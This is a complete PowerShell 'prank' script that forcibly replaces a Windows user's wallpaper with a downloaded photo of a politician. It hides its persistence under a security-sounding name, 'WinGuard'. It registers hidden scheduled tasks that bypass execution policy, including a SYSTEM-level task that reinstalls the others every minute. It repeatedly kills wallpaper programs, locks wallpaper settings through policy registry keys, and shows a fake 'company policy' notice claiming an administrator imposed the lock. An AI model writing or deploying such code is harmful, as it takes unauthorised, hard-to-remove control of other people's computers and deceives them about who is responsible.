# ===== CONFIG =====
$wallpaperUrl = "https://groundviews.org/wp-content/uploads/2014/11/20141121-afp-MaithripalaSirisena.jpg"
$base = "$env:ProgramData\WinGuard"
$guard = "$base\guard.ps1"
$heal = "$base\heal.ps1"
$notice = "$base\notice.ps1"
$image = "$base\wallpaper.jpg"
$backup = "$base\backup.txt"

New-Item $base -ItemType Directory -Force | Out-Null

# ===== BACKUP CURRENT WALLPAPER =====
try {
    (Get-ItemProperty "HKCU:\Control Panel\Desktop").Wallpaper | Out-File $backup -Force
} catch {}

# ===== DOWNLOAD IMAGE =====
Invoke-WebRequest $wallpaperUrl -OutFile $image -UseBasicParsing

# ===== GUARD SCRIPT (RUNS AS USER) =====
@"
`$img = '$image'

while (`$true) {

    # Kill wallpaper apps
    'Lively','WallpaperEngine','livelywpf','wallpaper32','wallpaper64' | ForEach-Object {
        Get-Process -Name `$_ -ErrorAction SilentlyContinue | Stop-Process -Force
    }

    # Apply wallpaper
    Set-ItemProperty "HKCU:\Control Panel\Desktop" Wallpaper `$img
    rundll32.exe user32.dll, UpdatePerUserSystemParameters

    # Lock wallpaper changes
    New-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop" -Force | Out-Null
    Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop" NoChangingWallpaper 1

    Start-Sleep 60
}
"@ | Out-File $guard -Encoding UTF8 -Force

# ===== HEAL SCRIPT (RUNS AS SYSTEM) =====
@"
if (!(Get-ScheduledTask -TaskName WinGuard -ErrorAction SilentlyContinue)) {
    schtasks /create /tn WinGuard /sc onlogon /rl highest /tr `"powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File $guard`"
}
"@ | Out-File $heal -Encoding UTF8 -Force

# ===== PRANK NOTICE =====
@"
Add-Type -AssemblyName PresentationFramework
[System.Windows.MessageBox]::Show(
"Your wallpaper is managed by company policy.`n`nThis device has been pranked by Sahindu 😄`n`nChanges are restricted by the system administrator.",
"Company Policy Notice",
"OK",
"Warning"
)
"@ | Out-File $notice -Encoding UTF8 -Force

# ===== CREATE USER TASK (WALLPAPER GUARD) =====
$actionUser = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File $guard"
$triggerUser = New-ScheduledTaskTrigger -AtLogOn

Register-ScheduledTask -TaskName "WinGuard" `
 -Action $actionUser `
 -Trigger $triggerUser `
 -RunLevel Highest -Force

# ===== CREATE SYSTEM SELF-HEAL TASK =====
$principalSys = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
$actionSys = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File $heal"
$triggerSys = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 1)

Register-ScheduledTask -TaskName "WinGuard-Heal" `
 -Action $actionSys `
 -Trigger $triggerSys `
 -Principal $principalSys -Force

# ===== LOGIN PRANK MESSAGE =====
$actionNotice = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File $notice"
$triggerNotice = New-ScheduledTaskTrigger -AtLogOn

Register-ScheduledTask -TaskName "WinGuard-Notice" `
 -Action $actionNotice `
 -Trigger $triggerNotice `
 -RunLevel Highest -Force

# ===== START GUARD NOW =====
Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File $guard"

Write-Host "WinGuard installed successfully."
